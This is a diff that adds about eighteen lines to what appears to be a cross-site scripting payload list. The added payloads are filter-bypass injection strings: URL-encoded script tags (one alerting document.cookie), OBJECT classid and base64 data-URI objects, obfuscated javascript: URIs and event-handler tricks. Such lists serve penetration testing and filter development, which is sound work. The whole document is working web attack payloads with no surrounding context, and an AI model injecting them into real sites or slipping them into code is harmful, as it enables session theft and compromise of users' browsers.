@@ -21,3 +21,21 @@
 <script>’alert(1)’.replace(/.+/,eval)</script>
 "><script>alert(1)</script><"
 #<script>alert(1)</script>
+~2; "%3Cscript%3Ealert(document.cookie)%3C/script%20ByPass%3E"
+%2500%27onmouseover=%27window.stop();alert(document.domain)%27
+//%250Aalert?.(1)//
+<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT>
+<object data="data:text/html;base64,%(base64)s">
+<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
+<object+data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
+<object/data=javascript:alert()>
+<object+data="javascript:alert(0)">
+<object data=javascript:alert(1)>
+<object data="javascript:alert(XSS)">
+<object/data="javascript&colon;alert/**/(document.domain)">//
+<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
+<object onafterscriptexecute=confirm(0)>
